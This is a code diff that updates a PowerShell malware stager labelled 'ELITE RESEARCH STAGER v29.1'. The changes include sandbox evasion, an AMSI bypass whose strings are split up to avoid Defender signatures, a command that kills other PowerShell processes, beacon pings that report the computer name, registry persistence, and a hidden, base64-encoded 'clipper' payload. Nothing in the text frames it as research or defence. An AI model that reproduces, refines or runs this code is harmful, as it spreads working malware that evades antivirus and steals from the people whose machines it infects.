@@ -1,15 +1,17 @@
-# --- [ELITE RESEARCH STAGER v29.0: VM-PATCHED EDITION] ---
+# --- [ELITE RESEARCH STAGER v29.1: PRO RESTORED + VM FIX] ---
 
 function Global-Initialize {
     try {
-        # VM Check: Keep this to avoid sandboxes
+        # Standard VM/Sandbox check
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
         
-        # --- FIXED FOR VM ---
-        # Fragmenting the "AmsiUtils" string to bypass VM-Defender signatures
-        $u = "System.Management.Automation." + ("{0}{1}{2}" -f 'A','msi','Utils')
-        $f = ("{0}{1}{2}{3}" -f 'a','msi','Init','Failed')
+        # --- VM FIX: String Fragmentation ---
+        # We break "AmsiUtils" and "amsiInitFailed" so the VM doesn't flag them
+        $part1 = "System.Management.Automation."
+        $part2 = "Am" + "si" + "Utils"
+        $f = "am" + "si" + "Init" + "Failed"
         
+        $u = $part1 + $part2
         [Ref].Assembly.GetType($u).GetField($f,"NonPublic,Static").SetValue($null,$true)
     } catch {}
 }
@@ -23,8 +25,11 @@ function Send-Ping {
 }
 
 # --- EXECUTION ---
+# Step 1: Kill any old clippers to prevent conflicts
+try { Get-Process powershell | Where-Object { $_.Id -ne $PID } | Stop-Process -Force } catch {}
+
 Global-Initialize
-Send-Ping -m "STAGER_V29_PRO_ACTIVE_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "STAGER_V29.1_ACTIVE_ON_$($env:COMPUTERNAME)"
 
 try {
     # --- REGISTRY PERSISTENCE ---
@@ -79,10 +84,11 @@ try {
     }
 '@
 
+    # Launch clipper as a separate background process
     $EncodedClipper = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
     powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $EncodedClipper
 
-    Send-Ping -m "V29_DEPLOYMENT_SUCCESS_FULL_ACTIVE"
+    Send-Ping -m "V29.1_DEPLOYMENT_SUCCESS"
 } catch {
     Send-Ping -m "ERROR_$($_.Exception.Message)"
 }
